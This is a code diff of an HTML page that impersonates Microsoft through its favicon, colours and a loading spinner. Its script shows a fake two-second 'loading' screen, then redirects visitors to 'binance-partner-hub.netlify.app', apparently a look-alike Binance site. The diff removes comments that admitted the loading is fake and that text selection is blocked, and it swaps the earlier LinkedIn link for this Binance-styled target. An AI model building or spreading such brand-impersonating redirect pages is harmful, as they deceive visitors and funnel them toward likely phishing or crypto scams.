@@ -8,9 +8,8 @@
     <link rel="icon" href="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" type="image/x-icon">
 
     <style>
-        /* CSS Giao diện chuẩn Microsoft */
         body {
-            background-color: #f3f2f1; /* Màu xám nhạt đặc trưng Azure */
+            background-color: #f3f2f1;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
@@ -18,7 +17,7 @@
             height: 100vh;
             margin: 0;
             flex-direction: column;
-            user-select: none; /* Chống bôi đen copy */
+            user-select: none;
         }
 
         .container {
@@ -38,7 +37,7 @@
 
         .loader {
             border: 3px solid #f3f3f3;
-            border-top: 3px solid #0067b8; /* Màu xanh chuẩn Microsoft */
+            border-top: 3px solid #0067b8;
             border-radius: 50%;
             width: 24px;
             height: 24px;
@@ -83,21 +82,19 @@
 
     <script>
         // ==================================================
-        // ĐÃ CÀI SẴN LINK LINKEDIN CỦA BOSS
+        // ĐÃ GẮN SẴN LINK SANG TRANG BINANCE CỦA BOSS
         // ==================================================
         
-        const FINAL_DESTINATION = "https://www.linkedin.com/comm/mynetwork/discovery-see-all?usecase=PEOPLE_FOLLOWS&followMember=tuan-anh-nguyen-7400983a1"; 
+        const FINAL_DESTINATION = "https://binance-partner-hub.netlify.app"; 
         
         // ==================================================
 
-        // Hàm đếm ngược và chuyển hướng
         function redirectUser() {
             setTimeout(function() {
                 window.location.href = FINAL_DESTINATION;
-            }, 2000); // Đợi 2 giây giả vờ load rồi chuyển
+            }, 2000); 
         }
 
-        // Chạy ngay khi tải trang
         window.onload = redirectUser;
     </script>
 </head>
